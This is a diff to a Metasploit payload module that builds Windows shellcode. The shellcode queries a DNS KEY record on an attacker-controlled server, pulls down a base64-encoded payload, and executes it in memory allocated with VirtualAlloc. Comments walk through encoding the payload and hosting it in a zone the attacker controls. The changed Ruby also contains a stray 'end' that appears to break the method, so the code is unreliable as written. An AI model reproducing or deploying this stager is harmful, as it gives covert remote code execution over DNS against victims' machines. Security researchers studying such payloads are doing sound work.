@@ -18,8 +18,8 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'DNSKEY Record Payload Execution',
-			'Description'   => 'Performs a DNSKEY query for a given DNS record & executes the returning payload',
+			'Name'          => 'DNS KEY Record Payload Execution',
+			'Description'   => 'Performs a DNS query for a given KEY record & executes the returning payload',
 			'Author'        =>
 				[
 					'corelanc0d3r <peter.ve[at]corelan.be>'
@@ -36,7 +36,7 @@ module Metasploit3
 		# Register command execution options
 		register_options(
 			[
-				OptString.new('DNSRECORD', [ true, "The DNS record to query" ]),
+				OptString.new('DNSRECORD', [ true, "The DNS record to retrieve" ]),
 			], self.class)
 	end
 
@@ -49,8 +49,11 @@ module Metasploit3
 	#    ./msfencode -b '\x00\x0a\x0d' -t raw > /tmp/msgbox.bin
 	# base64 < /tmp/msgbox.bin 
 	#  <put the output on one line>
-	# 3. Create a DNSKEY record in a zone you control and paste the base64 encoded version of the payload as public key
+	# 3. Create a KEY record in a zone you control and paste the base64 encoded version of the payload as public key
+	#    Hint : create a DNS zone and point the NS record to a public DNS server under your control
 	# 4. Generate this payload to perform the DNS query, retrieve the payload & execute it 
+
+	# Warning : the KEY record cannot be larger than 512 bytes, to avoid truncation
 
 	#
 	# Construct the payload
@@ -58,8 +61,15 @@ module Metasploit3
 	def generate
 
 		dnsname		= datastore['DNSRECORD']
-		wType		= 0x0019	#DNS_TYPE_KEY (DNSKEY)
-		wTypeOffset	= 0x1c
+
+		wType 		= 0x0019	#DNS_TYPE_KEY
+		wTypeOffset 	= 0x1c
+		queryoptions	= 0x248
+			# DNS_QUERY_RETURN_MESSAGE (0x200)
+			# DNS_QUERY_BYPASS_CACHE (0x08)
+			# DNS_QUERY_NO_HOSTS_FILE (0x40)
+		end
+
 		bufferreg 	= "edi"
 
 		#create actual payload
@@ -168,13 +178,13 @@ dnsquery:
 get_dnsname_return:
 	pop eax			; get ptr to dnsname (lpstrName)
 	push esp		; prepare ppQueryResultsSet
-	pop ebx			;   (put ptr to ptr to stack on stack)
+	pop ebx			;   (put ptr to stack ptr on stack)
 	sub ebx,4
 	push ebx
 	push 0			; pReserved
 	push ebx		; ppQueryResultsSet
 	push 0			; pExtra
-	push 0x48		; Options : DNS_QUERY_BYPASS_CACHE (0x08) + DNS_QUERY_NO_HOSTS_FILE (0x40)
+	push #{queryoptions}
 	push #{wType}		; wType
 	push eax		; lpstrName
 	push 0xC99CC96A 	; dnsapi.dll!DnsQuery_A
@@ -187,7 +197,7 @@ get_query_result:
 allocate_memory:
 	push 0x40              ; PAGE_EXECUTE_READWRITE
 	push 0x1000            ; MEM_COMMIT
-	push 0x1 	       ; one byte is enough
+	push 0x01 	       ; one byte is enough
 	push #{bufferreg}      ; DNS payload
 	push 0xE553A458        ; kernel32.dll!VirtualAlloc
 	call ebp              
